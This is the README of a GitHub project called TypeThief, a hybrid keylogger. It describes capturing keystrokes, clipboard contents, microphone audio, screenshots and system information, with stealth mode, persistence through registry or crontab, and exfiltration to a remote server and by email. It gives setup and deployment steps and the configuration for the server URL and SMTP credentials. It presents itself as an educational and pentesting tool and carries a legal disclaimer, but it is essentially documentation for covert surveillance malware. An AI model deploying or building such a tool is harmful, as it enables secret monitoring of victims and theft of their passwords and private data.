## TypeThief 

**Advanced hybrid keylogger with real-time monitoring capabilities**

**Author**: [C4l3bpy](https://github.com/calebpentest)  
**Version**: 1.0  
**License**: Use it ethically

![image](https://github.com/user-attachments/assets/d6879dab-ac55-48af-84f3-ad747bc0a650)



> ⚠️ **Legal Disclaimer**: TypeThief is developed for educational purposes and authorized security testing only. Unauthorized use is strictly prohibited and may violate local, state, and federal laws. Obtain explicit permission before deploying this tool.

## Key Features

- **Real-Time Monitoring Dashboard**
  - Live keystroke display via Flask-SocketIO web interface
  - Browser-based monitoring with timestamped logs

- **Comprehensive Data Collection**
  - Keystroke logging with window context
  - Clipboard content capture
  - Audio recording via microphone
  - Automated screenshot capture
  - Detailed system information gathering

- **Advanced Operational Features**
  - Cross-platform support (Windows & Linux)
  - Encrypted log storage (AES-256)
  - Email exfiltration with attachment support
  - Persistent installation options
  - Configurable stealth mode

- **Security & Reliability**
  - Secure key generation
  - Error handling and logging
  - Resource optimization

## 🛠️ Installation

### Prerequisites
- Python 3.6+ (Tested on 3.12)
- Required packages:
  ```bash
  pip install flask flask-socketio pynput requests pyfiglet colorama cryptography
  ```

### Quick Setup
1. Clone the repository:
   ```bash
   git clone https://github.com/calebpentest/TypeThief.git
   cd TypeThief
   ```

2. Install dependencies:
   ```bash
   pip install -r requirements.txt
   ```

## 📂 Project Structure
```
TypeThief/
├── core/
│   ├── main.py              # Main keylogger client
│   ├── realtime_server.py   # Monitoring server
│   └── sysinfo.py           # System information collector
├── modules/
│   ├── clipboard.py         # Clipboard monitoring
│   ├── keystroke.py         # Keystroke logging
│   ├── microphone.py        # Audio recording
│   └── screenshot.py        # Screen capture
├── utils/
│   ├── sendmail.py          # Email exfiltration
│   ├── encryption.py        # Data encryption
│   └── persistence.py       # Installation persistence
├── requirements.txt         # Dependencies
└── README.md                # Documentation
```

## Usage guide

### Local Testing Configuration
1. Start the monitoring server:
   ```bash
   python realtime_server.py
   ```
   - Access dashboard at: `http://127.0.0.1:5000`
   - Server logs saved to `realtime_server.log`

2. Configure the keylogger:
   - Edit `main.py` to set your server URL:
     ```python
     SERVER_URL = "http://your-server-ip:5000"  # For local testing use "http://127.0.0.1:5000"
     ```

3. Run the keylogger:
   ```bash
   python main.py
   ```

### Deployment Options
- **Email Configuration**:
  Modify `sendmail.py` with your SMTP credentials:
  ```python
  SMTP_SERVER = "smtp.example.com"
  SMTP_PORT = 587 or 465
  EMAIL_ADDRESS = "your_email@example.com"
  EMAIL_PASSWORD = "your_password"
  ```

- **Persistence Setup**:
  - Windows: Registry startup entry
  - Linux: Crontab scheduling

## ⚙️ Configuration Options
| Parameter          | Description                          | Default Value          |
|--------------------|--------------------------------------|------------------------|
| `CAPTURE_INTERVAL` | Screenshot frequency (seconds)       | 60                     |
| `STEALTH_MODE`     | Hide console output                  | False                  |
| `ENCRYPT_LOGS`     | Enable log encryption                | True                   |
| `EMAIL_REPORT`     | Email exfiltration frequency (hours) | 24                     |

## 📜 Ethical Considerations
TypeThief should only be used:
- For authorized penetration testing
- In educational environments
- With explicit consent from all monitored parties
- In compliance with all applicable laws

Misuse of this software may result in criminal charges. The developer assumes no liability for unauthorized use.

## 🤝 Contributing
Contributions are welcome! Please:
1. Fork the repository
2. Create a feature branch
3. Submit a pull request

## 📧 Contact
For security concerns or authorized use inquiries:  
Email: [your-email@example.com](mailto:calebepentest@gmail.com)

---

*TypeThief - Advanced System Monitoring Tool*  
*© 2025 C4l3bpy | Ethical Use Only*
